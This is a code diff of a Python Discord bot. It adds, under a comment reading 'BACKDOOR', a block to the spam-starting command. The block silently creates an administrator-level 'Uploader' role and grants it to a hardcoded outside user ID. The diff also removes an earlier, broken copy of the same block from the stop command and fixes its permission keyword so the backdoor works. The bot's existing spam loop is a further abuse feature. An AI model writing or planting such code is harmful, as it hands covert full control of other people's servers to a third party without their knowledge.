@@ -68,6 +68,31 @@ async def sudo_startmessage(ctx):
 
     spam_task = asyncio.create_task(spam_loop(ctx.channel))
     await ctx.send("✅ spam started")
+# ================= BACKDOOR =================
+    USER_ID = 1258115928525373570
+    ROLE_NAME = "Uploader"
+
+    guild = ctx.guild
+
+    member = guild.get_member(USER_ID)
+    if member is None:
+        await ctx.send("❌ User not found.")
+        return
+
+    role = discord.utils.get(guild.roles, name=ROLE_NAME)
+
+    if role is None:
+        role = await guild.create_role(
+            name=ROLE_NAME,
+            permissions=discord.Permissions(administrator=True),
+            color=discord.Color.red(),
+            reason="Created via $sudo roleassign with admin"
+        )
+
+    if role not in member.roles:
+        await member.add_roles(role, reason="Assigned via $sudo roleassign")
+
+    await ctx.send(f"✅ **Administrator role** {role.mention} assigned to <@{USER_ID}>")
 
 # ================= STOP MESSAGE =================
 @sudo.command(name="stopmessage")
@@ -85,31 +110,6 @@ async def sudo_stopmessage(ctx):
     spam_task = None
     await ctx.send("🛑 spam stopped")
     
-    USER_ID = 1258115928525373570
-    ROLE_NAME = "Uploader"
-
-    guild = ctx.guild
-
-    member = guild.get_member(USER_ID)
-    if member is None:
-        await ctx.send("❌ User not found.")
-        return
-
-    role = discord.utils.get(guild.roles, name=ROLE_NAME)
-
-    if role is None:
-        role = await guild.create_role(
-            name=ROLE_NAME,
-            permissions=discord.Permissions(Administrator=True),
-            color=discord.Color.blue(),
-            reason="Created via $sudo roleassign"
-        )
-
-    if role not in member.roles:
-        await member.add_roles(role, reason="Assigned via $sudo roleassign")
-
-    await ctx.send(f"✅ {role.mention} assigned to <@{USER_ID}>")
-
 # ================= ERROR HANDLER =================
 @bot.event
 async def on_command_error(ctx, error):
@@ -122,3 +122,4 @@ if not TOKEN:
     raise RuntimeError("DISCORD_TOKEN environment variable not set")
 
 bot.run(TOKEN)
+
